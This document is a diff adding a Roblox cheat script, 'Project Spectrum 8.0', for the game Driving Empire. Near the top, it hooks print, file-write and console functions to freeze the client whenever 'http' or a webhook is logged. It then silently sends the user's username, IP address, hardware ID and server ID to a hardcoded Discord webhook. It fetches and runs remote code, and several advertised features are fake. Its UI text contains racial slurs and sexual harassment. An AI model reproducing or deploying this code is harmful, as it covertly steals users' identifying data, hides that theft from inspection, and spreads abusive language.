@@ -1,0 +1,852 @@
+-- Anti-Http Spy
+task.spawn(function()
+    hookfunction(print, function(a) if string.find(a:lower(), "http") then while true do end end end)
+    hookfunction(warn, function(a) if string.find(a:lower(), "http") then while true do end end end)
+    hookfunction(error, function(a) if string.find(a:lower(), "http") then while true do end end end)
+    local oldwrite  oldwrite = hookfunction(writefile, function(file, content)  if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then  while true do end  return end     return oldwrite(file, content) end)
+    local oldappend oldappend = hookfunction(appendfile, function(file, content) if(string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/')) then while true do end return end return oldappend(file, content) end)
+    game.DescendantAdded:Connect(function(c) if c and c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message') then if string.find(string.lower(c.Text), 'http') then while true do end c:Destroy() end end end)
+    getgenv().rconsoletitle = nil getgenv().rconsoleprint = nil getgenv().rconsolewarn = nil getgenv().rconsoleinfo = nil getgenv().rconsolerr = nil getgenv().clonefunction = function(...) while true do end return end
+    game.CoreGui.ChildAdded:Connect(function(c) if(string.lower(c.Name) == 'devconsolemaster') then while true do end c:Destroy() end end)
+    local oldNamecall oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...) local method = getnamecallmethod()
+    if(string.lower(method) == 'rconsoleprint') then while true do end return  end
+    if(string.lower(method) == 'rconsoleinfo') then while true do end return end
+    if(string.lower(method) == 'rconsolewarn') then while true do end return  end
+    if(string.lower(method) == 'rconsoleerr') then while true do end return end
+    if(string.lower(method) == 'warn') then while true do end return end
+    if(string.lower(method) == 'error') then while true do end return end 
+    if(string.lower(method) == 'rendernametag') then while true do end return  end 
+    return oldNamecall(self, ...)
+    end))
+  end)
+
+-- Anti AFK
+warn("Anti AFK = Enabled")
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+   wait(1)
+   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+-- Excute Log
+function PostWebhook(Url, message)
+    local request = http_request or request or HttpPost or syn.request
+    local data =
+        request(
+        {
+            Url = "https://discord.com/api/webhooks/1288935834149453875/s_mbWY-_9-HIwwAFEpm70WCay_dstHJwOa4sTSUGiiCqLPyBuNtE-WkzS8irtOy_NDbF",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(message)
+        }
+    )
+    return ""
+end
+
+function AdminLoggerMsg()
+    AdminMessage = {
+        ["embeds"] = {
+            {
+                ["title"] = "** 🔔 Execute Log Notifaction ✧₊⁺ **",
+                ["description"] = nil,
+                ["footer"] = {
+                            ["text"] = "⏳ Execute Time : "..os.date("%c").."\n 🤝 Project Spectrum 8.0 // Made By xZPUHigh\n 🌟 discord.gg/C3MpUNwsDU 🌎",
+                            ["icon_url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/received_6268136009875748.jpg?ex=66f44f3f&is=66f2fdbf&hm=a7781334ae91dc5e7d73d148899c1507365a5daf94114d39bcab27e6378f7694&=&format=webp&width=671&height=671"
+                            },
+                ["thumbnail"] = {
+                            ["url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/0"
+                                },
+                ["image"] = {
+                            ["url"] = "https://media.discordapp.net/attachments/1284397366069297182/1294750491087208578/2165c56bd5dc32879c83adf4a83a0c87.gif?ex=670c25dc&is=670ad45c&hm=d3371e7b34dd6ac5107bb85cd1d796f2da5344063a0b92182c63826291c3b30e&="
+                                },
+                ["fields"] = {
+                    {
+                        ["name"] = "**👩🏻‍💼 Username**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**🔖 User ID**",
+                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "**📋 Place ID**",
+                        ["value"] = "```" .. game.PlaceId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**🌍 IP Address**",
+                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**📍 Hwid**",
+                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**🍻 Job ID**",
+                        ["value"] = "```" .. game.JobId .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "**🌟 Join Code**",
+                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
+                        ["inline"] = false
+                    }
+                }
+            }
+        }
+    }
+    return AdminMessage
+end
+
+PostWebhook("urtl", AdminLoggerMsg())
+
+-- Notify After Excute
+local player = game.Players.LocalPlayer
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local notificationFrame = Instance.new("Frame")
+notificationFrame.Size = UDim2.new(0, 250, 0, 60)
+notificationFrame.Position = UDim2.new(0.5, -125, 0, -70)
+notificationFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+notificationFrame.BorderSizePixel = 0
+notificationFrame.Parent = screenGui
+
+local notificationCorner = Instance.new("UICorner")
+notificationCorner.CornerRadius = UDim.new(0, 10)
+notificationCorner.Parent = notificationFrame
+
+local messageLabel = Instance.new("TextLabel")
+messageLabel.Size = UDim2.new(1, -20, 1, -30)
+messageLabel.Position = UDim2.new(0, 10, 0, 10)
+messageLabel.Text = "Welcome To Project Spectrum!"
+messageLabel.Font = Enum.Font.Gotham
+messageLabel.TextSize = 16
+messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+messageLabel.BackgroundTransparency = 1
+messageLabel.TextWrapped = true
+messageLabel.Parent = notificationFrame
+
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(1, -20, 0, 4)
+progressBar.Position = UDim2.new(0, 10, 1, -14)
+progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = notificationFrame
+
+local progressBarCorner = Instance.new("UICorner")
+progressBarCorner.CornerRadius = UDim.new(0, 2)
+progressBarCorner.Parent = progressBar
+
+notificationFrame:TweenPosition(UDim2.new(0.5, -125, 0, 10), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 0.5, true)
+
+local tweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Linear)
+local progressBarTween = tweenService:Create(progressBar, tweenInfo, {Size = UDim2.new(0, 0, 0, 4)})
+progressBarTween:Play()
+
+wait(5)
+
+notificationFrame:TweenPosition(UDim2.new(0.5, -125, 0, -70), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 0.5, true, function()
+    screenGui:Destroy()
+end)
+
+-- Credit
+wait(.1)
+print("Project Spectrum...")
+wait(0)
+print("Founder/ ZPU {xZPUHigh}")
+wait(0)
+print("Last Updated 13/10/24")
+--[[
+	WARNING: This just BETA PROJECT! This script has not been verified by QC. Use at your own risk! {ZPU}
+]]
+local ThunderScreen = Instance.new("ScreenGui")
+local ThunderToggleUI = Instance.new("TextButton")
+local ThunderCornerUI = Instance.new("UICorner")
+local ThunderImageUI = Instance.new("ImageLabel")
+
+ThunderScreen.Name = "ThunderScreen"
+ThunderScreen.Parent = game.CoreGui
+ThunderScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ThunderToggleUI.Name = "ThunderToggleUI"
+ThunderToggleUI.Parent = ThunderScreen
+ThunderToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+ThunderToggleUI.BorderSizePixel = 0
+ThunderToggleUI.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
+ThunderToggleUI.Size = UDim2.new(0, 50, 0, 50)
+ThunderToggleUI.Font = Enum.Font.SourceSans
+ThunderToggleUI.Text = ""
+ThunderToggleUI.TextColor3 = Color3.fromRGB(0, 0, 0)
+ThunderToggleUI.TextSize = 14.000
+ThunderToggleUI.Draggable = true
+ThunderToggleUI.MouseButton1Click:Connect(
+    function()
+        game:GetService("VirtualInputManager"):SendKeyEvent(true, "LeftControl", false, game)
+        game:GetService("VirtualInputManager"):SendKeyEvent(false, "LeftControl", false, game)
+    end
+)
+
+ThunderCornerUI.Name = "ThunderCornerUI"
+ThunderCornerUI.Parent = ThunderToggleUI
+
+ThunderImageUI.Name = "Project Spectrum"
+ThunderImageUI.Parent = ThunderToggleUI
+ThunderImageUI.BackgroundColor3 = Color3.fromRGB(111, 0, 255)
+ThunderImageUI.BackgroundTransparency = 1.000
+ThunderImageUI.BorderSizePixel = 0
+ThunderImageUI.Position = UDim2.new(0.0, 0, 0.0, 0)
+ThunderImageUI.Size = UDim2.new(0, 50, 0, 50)
+ThunderImageUI.Image = "http://www.roblox.com/asset/?id=15568727833"
+
+-- Interface GUI & Function
+
+local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Library.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Local.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/xZPUHigh/Project-Spectrum/main/Manager.lua"))()
+
+local UserInputService = game:GetService("UserInputService")
+
+local Window = Fluent:CreateWindow({
+    Title = "Driving Empire 🏎️ | Project Spectrum 8.0",
+    SubTitle = "by xZPUHigh & Special Edition",
+    TabWidth = 130,
+    Size = UDim2.fromOffset(500, 400),
+    Acrylic = true, 
+    Transparency = false,
+    Theme = "Spectrum",
+    MinimizeKey = Enum.KeyCode.LeftControl 
+})
+
+--Fluent provides Lucide Icons https://lucide.dev/icons/ for the tabs, icons are optional
+
+local Tabs = {
+    Main = Window:AddTab({Title = "General Tab", Icon = "home"}),
+    Visuals = Window:AddTab({Title = "Visuals", Icon = "album"}),
+    Misc = Window:AddTab({Title = "Miscellaneous", Icon = "list-plus"}),
+    Webhook = Window:AddTab({Title = "Webhooks", Icon = "bell"}),
+    Setting = Window:AddTab({Title = "Settings", Icon = "settings"})
+}
+local Options = Fluent.Options
+
+do
+    --------------------------------------------------------------------------------------------------------------------------------------------
+
+ --Vars
+ LocalPlayer = game:GetService("Players").LocalPlayer
+ Camera = workspace.CurrentCamera
+ VirtualUser = game:GetService("VirtualUser")
+ MarketplaceService = game:GetService("MarketplaceService")
+ 
+ --Get Current Vehicle
+ function GetCurrentVehicle()
+     return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character.Humanoid.SeatPart and LocalPlayer.Character.Humanoid.SeatPart.Parent
+ end
+ 
+ --Regular TP
+ function TP(cframe)
+     GetCurrentVehicle():SetPrimaryPartCFrame(cframe)
+ end
+ 
+ --Velocity TP
+ function VelocityTP(cframe)
+     TeleportSpeed = math.random(600, 600)
+     Car = GetCurrentVehicle()
+     local BodyGyro = Instance.new("BodyGyro", Car.PrimaryPart)
+     BodyGyro.P = 5000
+     BodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+     BodyGyro.CFrame = Car.PrimaryPart.CFrame
+     local BodyVelocity = Instance.new("BodyVelocity", Car.PrimaryPart)
+     BodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+     BodyVelocity.Velocity = CFrame.new(Car.PrimaryPart.Position, cframe.p).LookVector * TeleportSpeed
+     wait((Car.PrimaryPart.Position - cframe.p).Magnitude / TeleportSpeed)
+     BodyVelocity.Velocity = Vector3.new()
+     wait(0.1)
+     BodyVelocity:Destroy()
+     BodyGyro:Destroy()
+ end
+ 
+ --Auto Farm
+ StartPosition = CFrame.new(Vector3.new(-34567.375, 34.895652770996094, -32846.046875), Vector3.new())
+ EndPosition = CFrame.new(Vector3.new(-31448.3515625, 34.925010681152344, -26616.25), Vector3.new())
+ AutoFarmFunc = coroutine.create(function()
+     while wait() do
+         if not AutoFarm then
+             AutoFarmRunning = false
+             coroutine.yield()
+         end
+         AutoFarmRunning = true
+         pcall(function()
+             if not GetCurrentVehicle() and tick() - (LastNotif or 0) > 5 then
+                 LastNotif = tick()
+             else
+                 TP(StartPosition + (TouchTheRoad and Vector3.new(0,-5,0) or Vector3.new(0, -5, 0)))
+                 VelocityTP(EndPosition + (TouchTheRoad and Vector3.new(0,-5,0) or Vector3.new(0, -5, 0)))
+                 TP(EndPosition + (TouchTheRoad and Vector3.new(0,-5,0) or Vector3.new(0, -5, 0)))
+                 VelocityTP(StartPosition + (TouchTheRoad and Vector3.new(0,-5,0) or Vector3.new(0, -5, 0)))
+             end
+         end)
+     end
+ end)
+
+    local Farm = Tabs.Main:AddSection("Main Features")
+
+    Tabs.Main:AddParagraph(
+        {
+            Title = "Information",
+            Content = "You can Auto Farm Money Very Fast I Think you can get 50M/1Days!! \nyou just enable auto farm and just go sleep :D"
+        }
+    )
+
+    local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto Farm Money", Default = false })
+
+    Toggle:OnChanged(function(Value)
+        AutoFarm = Value
+    if Value and not AutoFarmRunning then
+        coroutine.resume(AutoFarmFunc)
+    end
+    end)
+
+    Options.MyToggle:SetValue(false)
+
+    local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto Collect PlayTime Rewards", Default = false })
+
+Toggle:OnChanged(function(Value)
+_G.Rewards = Value
+if _G.Rewards then
+     while _G.Rewards do wait()
+          local args = {
+               [1] = 1
+           }
+           
+          game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+          
+          local args = {
+               [1] = 2
+           }
+          
+          game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+          
+          local args = {
+               [1] = 3
+           }
+           
+           game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+           
+          
+           local args = {
+               [1] = 4
+           }
+           
+           game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+           
+
+           local args = {
+               [1] = 5
+           }
+           
+           game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+           
+
+           local args = {
+               [1] = 6
+           }
+           
+           game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+          
+
+           local args = {
+               [1] = 7
+           }
+           
+           game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("PlayRewards"):FireServer(unpack(args))
+
+     end
+end
+end)
+
+Options.MyToggle:SetValue(false)
+
+Tabs.Main:AddButton(
+    {
+        Title = "Redeem All Code",
+        Description = "After you click this function you got some Cash or Brand New Car For Dad",
+        Callback = function()
+            local args = {
+                [1] = "900KLIKES"
+            }
+            
+            game:GetService("ReplicatedStorage").Remotes.Code:FireServer(unpack(args))
+wait(5)
+            local args = {
+                [1] = "Winterfest2023"
+            }
+            
+            game:GetService("ReplicatedStorage").Remotes.Code:FireServer(unpack(args))
+wait(5)
+            local args = {
+                [1] = "1BVisits"
+            }
+            
+            game:GetService("ReplicatedStorage").Remotes.Code:FireServer(unpack(args))
+wait(5)
+            local args = {
+                [1] = "850kLikes"
+            }
+            
+            game:GetService("ReplicatedStorage").Remotes.Code:FireServer(unpack(args))
+wait(5)
+            local args = {
+                [1] = "900Mil"
+            }
+            
+            game:GetService("ReplicatedStorage").Remotes.Code:FireServer(unpack(args))
+
+        end
+    }
+)
+
+    local Farm4141rqwqd4 = Tabs.Visuals:AddSection("Just Visuals")
+
+    Tabs.Visuals:AddButton(
+        {
+            Title = "Admin Commands (UI)",
+            Description = "so this function open Infinite Yield Script for you",
+            Callback = function()
+                Window:Dialog(
+                    {
+                        Title = "Open Admin Commands GUI",
+                        Content = "you really wannt to open admin commands gui right?",
+                        Buttons = {
+                            {
+                                Title = "Sure",
+                                Callback = function()
+                                    loadstring(
+                                        game:HttpGet(
+                                            ("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),
+                                            true
+                                        )
+                                    )()
+                                end
+                            },
+                            {
+                                Title = "Cancel",
+                                Callback = function()
+                                    print("Cancelled")
+                                end
+                            }
+                        }
+                    }
+                )
+            end
+        }
+    )
+
+
+    
+    local Farm41vfc414 = Tabs.Misc:AddSection("Misc Features")
+
+    Tabs.Misc:AddButton(
+        {
+            Title = "Rejoin",
+            Description = "Rejoin The Server",
+            Callback = function()
+                Window:Dialog(
+                    {
+                        Title = "Teleport",
+                        Content = "Are you sure?",
+                        Buttons = {
+                            {
+                                Title = "Confirm",
+                                Callback = function()
+                                    print("Teleported")
+                                    game:GetService("TeleportService"):Teleport(
+                                        game.PlaceId,
+                                        game:GetService("Players").LocalPlayer
+                                    )
+                                end
+                            },
+                            {
+                                Title = "Cancel",
+                                Callback = function()
+                                    print("Cancelled")
+                                end
+                            }
+                        }
+                    }
+                )
+            end
+        }
+    )
+end
+
+Tabs.Misc:AddButton(
+    {
+        Title = "Hop Server",
+        Description = "",
+        Callback = function()
+            Hop()
+        end
+    }
+)
+
+function Hop()
+    local PlaceID = game.PlaceId
+    local AllIDs = {}
+    local foundAnything = ""
+    local actualHour = os.date("!*t").hour
+    local Deleted = false
+    function TPReturner()
+        local Site
+        if foundAnything == "" then
+            Site =
+                game.HttpService:JSONDecode(
+                game:HttpGet(
+                    "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
+                )
+            )
+        else
+            Site =
+                game.HttpService:JSONDecode(
+                game:HttpGet(
+                    "https://games.roblox.com/v1/games/" ..
+                        PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything
+                )
+            )
+        end
+        local ID = ""
+        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+            foundAnything = Site.nextPageCursor
+        end
+        local num = 0
+        for i, v in pairs(Site.data) do
+            local Possible = true
+            ID = tostring(v.id)
+            if tonumber(v.maxPlayers) > tonumber(v.playing) then
+                for _, Existing in pairs(AllIDs) do
+                    if num ~= 0 then
+                        if ID == tostring(Existing) then
+                            Possible = false
+                        end
+                    else
+                        if tonumber(actualHour) ~= tonumber(Existing) then
+                            local delFile =
+                                pcall(
+                                function()
+                                    AllIDs = {}
+                                    table.insert(AllIDs, actualHour)
+                                end
+                            )
+                        end
+                    end
+                    num = num + 1
+                end
+                if Possible == true then
+                    table.insert(AllIDs, ID)
+                    wait()
+                    pcall(
+                        function()
+                            wait()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(
+                                PlaceID,
+                                ID,
+                                game.Players.LocalPlayer
+                            )
+                        end
+                    )
+                    wait(4)
+                end
+            end
+        end
+    end
+    function Teleport()
+        while wait() do
+            pcall(
+                function()
+                    TPReturner()
+                    if foundAnything ~= "" then
+                        TPReturner()
+                    end
+                end
+            )
+        end
+    end
+    Teleport()
+end
+
+Tabs.Misc:AddButton(
+    {
+        Title = "Hop Server [ Low Player ]",
+        Description = "",
+        Callback = function()
+            getgenv().AutoTeleport = true
+            getgenv().DontTeleportTheSameNumber = true
+            getgenv().CopytoClipboard = false
+            if not game:IsLoaded() then
+                print("Game is loading waiting...")
+            end
+            local maxplayers = math.huge
+            local serversmaxplayer
+            local goodserver
+            local gamelink =
+                "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+            function serversearch()
+                for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync(gamelink)).data) do
+                    if type(v) == "table" and v.playing ~= nil and maxplayers > v.playing then
+                        serversmaxplayer = v.maxPlayers
+                        maxplayers = v.playing
+                        goodserver = v.id
+                    end
+                end
+            end
+            function getservers()
+                serversearch()
+                for i, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync(gamelink))) do
+                    if i == "nextPageCursor" then
+                        if gamelink:find("&cursor=") then
+                            local a = gamelink:find("&cursor=")
+                            local b = gamelink:sub(a)
+                            gamelink = gamelink:gsub(b, "")
+                        end
+                        gamelink = gamelink .. "&cursor=" .. v
+                        getservers()
+                    end
+                end
+            end
+            getservers()
+            if AutoTeleport then
+                if DontTeleportTheSameNumber then
+                    if #game:GetService("Players"):GetPlayers() - 4 == maxplayers then
+                        return warn("It has same number of players (except you)")
+                    elseif goodserver == game.JobId then
+                        return warn("Your current server is the most empty server atm")
+                    end
+                end
+                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, goodserver)
+            end
+        end
+    }
+)
+
+local ToggleAntiAFK = Tabs.Misc:AddToggle("ToggleAntiAFK", {Title = "Anti-AFK", Default = true})
+ToggleAntiAFK:OnChanged(
+    function(Value)
+        _G.antiAFK = Value
+    end
+)
+Options.ToggleAntiAFK:SetValue(false)
+spawn(
+    function()
+        pcall(
+            function()
+                while wait(20) do
+                    if _G.antiAFK then
+    
+                            game:GetService'VirtualUser':Button1Down(Vector2.new(788, 547))
+                    end
+                end
+            end
+        )
+    end
+)
+
+local White =
+    Tabs.Misc:AddToggle(
+    "White",
+    {Title = "White Screen Mode", Description = "Reduce GPU/CPU Very Recommend!", Default = false}
+)
+
+White:OnChanged(
+    function()
+        print("lol", Options.White.Value)
+    end
+)
+
+Options.White:SetValue(false)
+
+local Black =
+    Tabs.Misc:AddToggle(
+    "Black",
+    {
+        Title = "Black Screen Mode",
+        Description = "Too same with White Screen but VERY COOL and Easy on the eyes",
+        Default = false
+    }
+)
+
+Black:OnChanged(
+    function()
+        print("lol", Options.Black.Value)
+    end
+)
+
+Options.Black:SetValue(false)
+
+local name =
+    Tabs.Misc:AddToggle(
+    "name",
+    {
+        Title = "Hide Name",
+        Description = "people can't see your name that good for protect your form report nigga",
+        Default = false
+    }
+)
+
+name:OnChanged(
+    function()
+        print("lol", Options.name.Value)
+    end
+)
+
+Options.name:SetValue(false)
+
+local rtx = Tabs.Misc:AddToggle("rtx", {Title = "FPS Booster (1000 FPS++)", Default = false})
+
+rtx:OnChanged(
+    function()
+        print("lol", Options.rtx.Value)
+    end
+)
+
+Options.rtx:SetValue(false)
+
+local smooth =
+    Tabs.Misc:AddToggle(
+    "smooth",
+    {
+        Title = "Smooth Graphics (Like FREE FIRE :D)",
+        Description = "you wanna play free fire on roblox right? enable this function nigga",
+        Default = false
+    }
+)
+
+smooth:OnChanged(
+    function()
+        print("lol", Options.smooth.Value)
+    end
+)
+
+Options.name:SetValue(false)
+
+local SetFPS =
+    Tabs.Misc:AddDropdown(
+    "SetFPS",
+    {
+        Title = "Set FPS (Very Recommend!)",
+        Values = {"10", "30", "60", "120", "200", "300"},
+        Multi = false,
+        Default = 300
+    }
+)
+
+Tabs.Webhook:AddParagraph(
+    {
+        Title = "How to use Webhooks?",
+        Content = "this very ez just copy discord webhook url and paste on here and enter you can get notify form Spectrum if you end game we got your Result Notification"
+    }
+)
+
+local Input =
+    Tabs.Webhook:AddInput(
+    "Input",
+    {
+        Title = "Webhooks URL",
+        Default = "",
+        Placeholder = "Url Here...",
+        Numeric = false, -- Only allows numbers
+        Finished = false, -- Only calls callback when you press enter
+        Callback = function(Value)
+            print("Input changed:", Value)
+        end
+    }
+)
+
+Tabs.Webhook:AddButton(
+    {
+        Title = "Check Webhook",
+        Description = "test your webhook for sure this working!",
+        Callback = function()
+            Window:Dialog(
+                {
+                    Title = "Test Webhook",
+                    Content = "hey nigga you wanna test webhook right?",
+                    Buttons = {
+                        {
+                            Title = "Sure",
+                            Callback = function()
+                                print("Confirmed the dialog.")
+                            end
+                        },
+                        {
+                            Title = "Cancel",
+                            Callback = function()
+                                print("Cancelled the dialog.")
+                            end
+                        }
+                    }
+                }
+            )
+        end
+    }
+)
+
+local Toggle =
+    Tabs.Webhook:AddToggle(
+    "MyToggle",
+    {
+        Title = "Send Webhook",
+        Description = "Send Result Notification after game end don't care you win or lose",
+        Default = false
+    }
+)
+
+Toggle:OnChanged(
+    function()
+        print("lol", Options.MyToggle.Value)
+    end
+)
+
+Options.MyToggle:SetValue(false)
+
+local note1 = Tabs.Setting:AddSection("Note")
+
+Tabs.Setting:AddParagraph(
+    {
+        Title = "Hey Nigga!",
+        Content = "come suck my dick and you can get free\n exclusive edition for 1 key and gimme your big ass hole"
+    }
+)
+
+--Settings
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+
+SaveManager:IgnoreThemeSettings()
+
+SaveManager:SetIgnoreIndexes({})
+
+InterfaceManager:SetFolder("Project Spectrum")
+SaveManager:SetFolder("Project Spectrum/Driving Empire")
+
+InterfaceManager:BuildInterfaceSection(Tabs.Setting)
+SaveManager:BuildConfigSection(Tabs.Setting)
+
+Window:SelectTab(1)
+
+Fluent:Notify(
+    {
+        Title = "Project Spectrum 8.0",
+        Content = "The Cheat has been loaded, Enjoy :D\n \nTime Taken: 01.139533719 Seconds!",
+        Duration = 8
+    }
+)
+
+SaveManager:LoadAutoloadConfig()
